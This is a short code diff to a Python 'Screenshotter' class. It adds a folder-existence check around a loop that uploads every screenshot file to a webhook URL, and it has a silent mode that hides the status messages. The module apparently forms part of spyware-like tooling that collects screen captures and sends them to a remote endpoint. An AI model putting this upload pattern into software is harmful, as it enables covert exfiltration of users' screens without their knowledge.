@@ -55,25 +55,27 @@ class Screenshotter:
         
     
     def send_screenshots(self):
-        for filename in os.listdir(self.screenshotpath):
-            if not filename.lower().endswith(self.valid_ext):
-                continue
+        if os.path.exists(self.screenshotpath):
+            for filename in os.listdir(self.screenshotpath):
+                if not filename.lower().endswith(self.valid_ext):
+                    continue
 
-            path = os.path.join(self.screenshotpath, filename)
+                path = os.path.join(self.screenshotpath, filename)
 
-            with open(path, "rb") as f:
-                response = requests.post(
-                    self.webhookURL,
-                    data={"content": f"Uploading: {filename}"},
-                    files={"file": (filename, f)}
-                )
-            
-            if response.status_code == 204:
-                print_non_silent(self, f"Successfully uploaded: {filename}")
-            else:
-                print_non_silent(self, f"Failed upload: {filename} | {response.status_code} | {response.text}")
-            
-            sleep(1) # avoid rate limiting
+                with open(path, "rb") as f:
+                    response = requests.post(
+                        self.webhookURL,
+                        data={"content": f"Uploading: {filename}"},
+                        files={"file": (filename, f)}
+                    )
+                
+                if response.status_code == 204:
+                    print_non_silent(self, f"Successfully uploaded: {filename}")
+                else:
+                    print_non_silent(self, f"Failed upload: {filename} | {response.status_code} | {response.text}")
+                
+                sleep(1) # avoid rate limiting
+        else: print_non_silent(self, f"\n!!!\nNo screenshots found, skipping to next step\n!!!\n")
 
     def clear_screenshots(self):
         if os.path.exists(self.screenshotpath):
